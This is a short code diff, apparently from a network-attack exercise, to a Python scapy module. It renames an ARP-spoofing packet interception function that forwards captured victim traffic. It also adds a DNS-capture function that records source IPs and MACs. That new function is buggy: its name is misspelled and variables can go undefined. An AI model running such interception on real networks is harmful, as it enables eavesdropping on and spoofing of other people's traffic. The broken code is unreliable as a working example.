@@ -1,8 +1,9 @@
 from scapy.all import *
 from scapy.layers.inet import IP, TCP, UDP
+import util
 
 
-def intercept(pkt, interceptedPkt, attackerMAC, spoofIP, serverMAC, victimMAC, networkInterface):
+def interceptARP(pkt, interceptedPkt, attackerMAC, spoofIP, serverMAC, victimMAC, networkInterface):
     # update intercepted packet list
     interceptedPkt.append(pkt)
 
@@ -27,3 +28,15 @@ def intercept(pkt, interceptedPkt, attackerMAC, spoofIP, serverMAC, victimMAC, n
         sendp(pkt, iface=networkInterface)
         print(pkt.show())
 
+#capture dns request and response packets for DNS
+def interceprDNS(pkt,  networkInterface):
+    print("get there")
+    if pkt.haslayer('UDP') and pkt.haslayer('DNS') and pkt.haslayer('IP'):
+        ip = pkt[IP].src
+        if pkt.haslayer('Ether'):
+            mac = pkt[Ether].src
+        else :
+            mac = util.getMAC(ip, networkInterface)
+    pkt.show()
+
+    return (pkt, ip, mac)
